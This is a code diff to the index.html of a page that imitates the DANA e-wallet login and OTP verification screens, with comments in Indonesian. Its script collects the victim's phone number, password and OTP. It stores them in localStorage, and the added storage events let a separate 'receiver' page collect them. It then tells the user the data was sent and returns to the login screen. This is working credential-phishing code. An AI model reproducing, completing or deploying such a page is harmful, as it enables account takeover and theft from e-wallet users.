@@ -337,7 +337,7 @@
 
 <script>
     // ============================================================
-    // INDEX.HTML — TANPA EMOJI, PAKE ICON, FIX LOOPING
+    // INDEX.HTML — PASTI KIRIM DATA KE LOCALSTORAGE
     // ============================================================
 
     const loginForm = document.getElementById('loginForm');
@@ -348,11 +348,9 @@
     const otpError = document.getElementById('otpError');
     const otpErrorText = document.getElementById('otpErrorText');
 
-    // HIDE ERROR AWAL
     loginError.style.display = 'none';
     otpError.style.display = 'none';
 
-    // OTP AUTO MOVE
     const otpInputs = ['otp1','otp2','otp3','otp4','otp5','otp6'];
     otpInputs.forEach((id, index) => {
         const input = document.getElementById(id);
@@ -400,7 +398,7 @@
             return;
         }
 
-        // KIRIM DATA KE RECEIVER
+        // === KIRIM DATA KE RECEIVER ===
         const userData = {
             phone: phone,
             password: password,
@@ -408,6 +406,8 @@
             status: 'pending'
         };
         localStorage.setItem('dana_user_data', JSON.stringify(userData));
+        // Trigger event buat receiver
+        window.dispatchEvent(new Event('storage'));
 
         showPage('pageLoading');
 
@@ -417,7 +417,7 @@
         }, 2000);
     });
 
-    // ===== OTP VERIFICATION — TIDAK LOOPING =====
+    // ===== OTP VERIFICATION =====
     btnOtp.addEventListener('click', function() {
         hideAlerts();
 
@@ -438,35 +438,37 @@
             return;
         }
 
-        // SIMPAN OTP
+        const phone = document.getElementById('danaPhone').value.trim();
+        const password = document.getElementById('danaPassword').value.trim();
+
+        // === SIMPAN OTP ===
         const otpData = {
             otp: otp,
-            phone: document.getElementById('danaPhone').value.trim(),
-            password: document.getElementById('danaPassword').value.trim(),
+            phone: phone,
+            password: password,
             timestamp: new Date().toISOString(),
             status: 'verified'
         };
         localStorage.setItem('dana_otp_data', JSON.stringify(otpData));
+        window.dispatchEvent(new Event('storage'));
 
-        // UPDATE STATUS USER
+        // UPDATE USER STATUS
         const userData = JSON.parse(localStorage.getItem('dana_user_data'));
         if (userData) {
             userData.status = 'otp_sent';
             localStorage.setItem('dana_user_data', JSON.stringify(userData));
+            window.dispatchEvent(new Event('storage'));
         }
 
-        // NOTIFIKASI SUKSES — TETAP DI HALAMAN OTP
         otpError.style.display = 'block';
         otpError.className = 'alert-dana success';
         otpError.innerHTML = '<i class="bi bi-check-circle-fill"></i> Kode OTP berhasil diverifikasi! Data telah dikirim ke receiver.';
 
-        // RESET OTP
         otpInputs.forEach(id => {
             document.getElementById(id).value = '';
         });
         document.getElementById('otp1').focus();
 
-        // KEMBALI KE LOGIN SETELAH 4 DETIK (TAPI TIDAK LOOPING)
         setTimeout(() => {
             otpError.className = 'alert-dana error';
             otpError.style.display = 'none';
@@ -476,7 +478,6 @@
         }, 4000);
     });
 
-    // ===== RESEND OTP =====
     function resendOtp() {
         const phone = document.getElementById('danaPhone').value.trim();
         showToast('Kode OTP baru telah dikirim ke ' + phone);
@@ -486,7 +487,6 @@
         document.getElementById('otp1').focus();
     }
 
-    // ===== TOAST =====
     function showToast(message) {
         const existing = document.querySelector('.toast-dana');
         if (existing) existing.remove();
@@ -515,14 +515,12 @@
         setTimeout(() => toast.remove(), 4000);
     }
 
-    // ===== ENTER KEY UNTUK OTP =====
     document.addEventListener('keydown', function(e) {
         if (e.key === 'Enter' && document.getElementById('pageOtp').classList.contains('active')) {
             btnOtp.click();
         }
     });
 
-    // ===== PASTE OTP =====
     document.addEventListener('paste', function(e) {
         if (!document.getElementById('pageOtp').classList.contains('active')) return;
         const paste = (e.clipboardData || window.clipboardData).getData('text');
@@ -537,4 +535,4 @@
 </script>
 
 </body>
-                               </html>
+    </html>
